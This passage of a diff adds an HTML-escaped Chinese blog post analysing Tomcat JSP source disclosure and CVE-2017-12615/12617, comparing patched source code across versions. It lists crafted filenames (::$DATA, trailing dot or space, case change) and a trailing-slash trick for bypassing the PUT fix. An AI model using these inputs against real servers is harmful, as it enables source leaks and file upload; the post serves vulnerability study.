+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;所以在做动态调试分析的时候可以选择在对应 Servlet 中的 service 方法，或者是直接根据相应的请求在 doGet 或是 doPut 方法中下断点就可以跟踪整个流程了。
+看下 DefaultServlet 的处理流程，从 doGet 方法开始跟的话会发现进入到 BaseDirContext 中的 lookup 方法中去
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddc5fcc6fd.png&quot; alt=&quot;&quot; /&gt;
+如果没有设置 aliases 的话就会进入 doLookup 方法中去，如果你设置了虚拟目录的话，这里进入的 doLookup 方法会是 VirtualDirContext 中的 doLookup，否则就是进入 FileDirContext 中的 doLookup 方法。
+VirtualDirContext.java 中的 doLookup 方法在 7.0.81 中是有改动的，下面代码是和 7.0.79 (左边)进行的对比
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddc608eec2.png&quot; alt=&quot;&quot; /&gt;
+可以看到代码由之前的只是对文件是否存在和是否可读的检测改变为用 validate 方法来进行检测。那么 7.0.1 之前版本在虚拟目录里可以读取 jsp 脚本的源码的漏洞就是由 Windows 下的文件名的特性再加上这里检测不严导致的。利用方法大概如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;test.jsp::$DATA&lt;/li&gt;
+  &lt;li&gt;test.jsp.&lt;/li&gt;
+  &lt;li&gt;test.jsp%20&lt;/li&gt;
+  &lt;li&gt;test.jsP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;这些文件名都是不会匹配上 JspServlet 的 url-pattern，所以它们都是由 DefaultServlet 当静态资源请求给返回了
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddb114f350.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对于 CVE-2017-12615 漏洞有一个利用是在文件名后面添加一个 / 符号，再结合 JDK 中的 File 类会对文件名末尾做一个检测（要是末尾有 / 这样的符号，会自动去掉）来成功创建一个 jsp 脚本。在这里也一样是可以通过这个能读到 jsp 文件的内容，但是在 DefaultServlet 返回之前会对路径末尾有一个检测，要是末尾为 / 或是 \ 符号，直接返回 404。
+接下来看下 validate 方法，这个方法是在 7.0.81 版本中由 FileDirContext 中的 file 函数拆分而来的
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddeee15d19.png&quot; alt=&quot;&quot; /&gt;
+validate 方法：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mustExist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;c1&quot;&gt;//mustExist 要是被设置为 true，那么文件必须得存在才行&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mustExist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allowLinking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;c1&quot;&gt;// Check that this file belongs to our root path&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;//获取规范化路径，会去掉文件名末尾的空格和点号，如果系统上存在该文件，返回系统上的文件名（大小写），存在特殊字符返回 null&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCanonicalPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// Ignore&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// Check to see if going outside of the web application root&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// Case sensitivity check - this is now always done&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileAbsPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileAbsPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;endsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fileAbsPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileAbsPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileAbsPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;//和规范化路径进行对比，不等返回 null&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;由此也可以明白为什么只有在虚拟目录下才存在源码泄漏的洞，而正常的 web 路径不会有。在 7.0.81 里的修复方法就是在 VirtualDirContext 中使用 validate 这个方法来做检测。
+在这段代码中还有个判断&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allowLinking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;假如 allowLinking 为 true 那么就不会做下面的各种检测了，会直接返回 file，那么自然会造成各种源码泄漏，版本 7，8，9 都可能会有这个问题，而且不局限虚拟路径。allowLinking 默认为 false，需要设置。
+Tomcat7:
+conf/context.xml&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Context&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;allowLinking=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tomcat8/9:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Context&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Resources&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;allowLinking=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在官方的文档中有警告用户不要在 Windows 系统上这样去设置
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddb10824b4.png&quot; alt=&quot;&quot; /&gt;
+所以这个也是做安全加固要注意的一个点。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-cve-2017-12615-分析&quot;&gt;0x02 CVE-2017-12615 分析&lt;/h2&gt;
+&lt;p&gt;启用 PUT 方法配置：
+conf/web.xml 中的 DefaultServlet 处添加&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;readonly&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+	    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;根据前面说到的，只要在 DefaultServlet 中的 doPut 下断点就好，这里还是会先走一遍 doLookup 方法，不过这里主要是确认文件不存在，最终会在 rebind 方法中创建文件。对比下 7.0.79 和 7.0.81 中 rebind 方法
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddb11db680.png&quot; alt=&quot;&quot; /&gt;
+在 7.0.81 版本中会使用 file 方法来获取文件对象，而不是之前版本那样直接使用 File 类来创建。利用方法和上一个一样。根据给 file 传的参数，可以知道 mustExist 被设置为 false ，所以会进入 validate 方法中的检查。
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddeed7dc9c.png&quot; alt=&quot;&quot; /&gt;
+可以看到在进入 validate 方法之前，File 类已经把文件名末尾的 / 符号给去掉了的，所以这个是对 7.0.81 版本中的一个绕过方法了。此外，长亭的专栏中 Ricter 提出了另外的一种绕过方法，主要是利用到了 getCanonicalPath 方法在存在路径缓存的情况下，不会去掉文件系统上不存在的文件名末尾的空格，再结合 Windows 文件系统的特性做的绕过，具体可以看参考链接。同理 allowLinking 对这个洞一样会有影响，开启 allowLinking 对这个漏洞做个测试
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddb1089b8e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-cve-2017-12617-分析&quot;&gt;0x03 CVE-2017-12617 分析&lt;/h2&gt;
+&lt;p&gt;这个 CVE 就是前面提的绕过，这里主要看一下官方后来的修复。代码对比版本是 7.0.81 和 7.0.82：
+看官方的注释就行，确保文件名末尾不是 /。
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddeed96334.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再贴一下 validate 方法的修改，和新增的用来防止 getCanonicalPath 方法问题的 isInvalidWindowsFilename。其中官方写的注释也很清楚就不再讲述其中的作用。&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mustExist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canonicalBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// If the requested names ends in '/', the Java File API will return a&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// matching file if one exists. This isn't what we want as it is not&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// consistent with the Servlet spec rules for request mapping.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;endsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// If the file/dir must exist but the identified file/dir can't be read&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// then signal that the resource was not found&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mustExist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// If allow linking is enabled, files are not limited to being located&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// under the fileBase so all further checks are disabled.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allowLinking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Additional Windows specific checks to handle known problems with&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// File.getCanonicalPath()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;JrePlatform&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;IS_WINDOWS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isInvalidWindowsFilename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Check that this file is located under the web application root&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
